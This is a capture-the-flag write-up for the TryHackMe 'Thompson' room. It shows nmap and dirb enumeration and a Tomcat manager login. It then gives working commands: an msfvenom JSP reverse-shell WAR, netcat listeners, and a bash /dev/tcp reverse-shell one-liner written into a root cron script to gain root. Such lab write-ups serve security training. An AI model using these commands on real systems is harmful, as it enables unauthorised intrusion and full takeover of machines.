---
layout: post
title: "Thompson CTF Write-up"
date: 2024-10-05
link: https://tryhackme.com/room/bsidesgtthompson
link_text: "Thompson CTF"
categories: ctf-writeups
---

The goal of this CTF is to find two flags: `user.txt` and `root.txt`.

---

We will start by running an **nmap** scan:

```bash
nmap -p- -A -T5 [target machine IP] -Pn
```

- **`-p-`**: Scans all ports
- **`-A`**: Shows all information
- **`-T5`**: Denotes speed on a scale of 1-5
- **`-Pn`**: Tells nmap to assume the host is up

![Nmap scan](/assets/writeup_assets/thompson-ctf-writeup/figure_1.png "Figure 1: Nmap scan")
*Figure 1: Nmap scan*

We see three ports open: **SSH (22)**, **AJP13 (8009)**, and **HTTP (8080)**.

---

Let's try to connect via SSH to see what we get:

```bash
ssh [target machine IP]
```

![SSH connection attempt](/assets/writeup_assets/thompson-ctf-writeup/figure_2.png "Figure 2: SSH connection attempt")
*Figure 2: SSH connection attempt*

We need a password, and we do not have one right now. We have to move on for now.

Next, let's see if we can find a clue on the HTTP port. I will run **dirb** while I explore the website in my browser.

```bash
dirb http://[target machine IP]:8080
```

Now put the URL portion of that command in the browser's search bar, including the port.

![Website investigation](/assets/writeup_assets/thompson-ctf-writeup/figure_3.png "Figure 3: Website investigation")
*Figure 3: Website investigation*

Nothing here, but let's check our **dirbuster** output.

![Dirbuster output](/assets/writeup_assets/thompson-ctf-writeup/figure_4.png "Figure 4: Dirbuster output")
*Figure 4: Dirbuster output*

The entries **/manager** and **/host-manager** are worth checking out.

Starting with **/manager**, if we try to navigate to that URL, we get a JavaScript sign-in pop-up. If we click "Cancel" on this, it brings up a page with the username and password we need to sign in. We will simply reload the page, enter those credentials, and sign in.

![Manager login](/assets/writeup_assets/thompson-ctf-writeup/figure_5.png "Figure 5: /manager login")
*Figure 5: /manager login*

![Username and password](/assets/writeup_assets/thompson-ctf-writeup/figure_6.png "Figure 6: Username and password")
*Figure 6: Username and password*

---

Now logged in, we see that we can upload **WAR files**. Let's use **msfvenom** to create a WAR file that will give us a reverse shell.

```bash
touch shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[your IP] LPORT=1337 -f war -o shell.war
```

![Shell.war upload](/assets/writeup_assets/thompson-ctf-writeup/figure_7.png "Figure 7: shell.war upload")
*Figure 7: shell.war upload*

We also need to set up a **netcat** listener:

```bash
nc -lvnp 1337
```

With those steps done, click **Deploy** and navigate to **/shell**. Let’s spawn a bash shell for easier navigation.

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

![Connection made](/assets/writeup_assets/thompson-ctf-writeup/figure_8.png "Figure 8: Connection made")
*Figure 8: Connection made*

Just like that, we have a connection with a bash shell. We can find **user.txt** in **/home/jack**.

---

## Task 3: Privilege Escalation

---

Now, we need to escalate privileges to find **root.txt**. During enumeration, we find that there is a **cron job** running **id.sh** every minute as root.

```bash
cat /etc/crontab
```

![Crontab](/assets/writeup_assets/thompson-ctf-writeup/figure_9.png "Figure 9: crontab")
*Figure 9: crontab*

If we echo this one-liner into **id.sh**, we should spawn a root shell after we set up a netcat listener in a new tab.

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/[your IP]/1338 0>&1'" > id.sh
```

```bash
nc -lvnp 1338
```

![Root shell](/assets/writeup_assets/thompson-ctf-writeup/figure_10.png "Figure 10: root shell")
*Figure 10: Root shell*

We are root! The root flag is located at **/root/root.txt**.

Congratulations, we have completed this box!
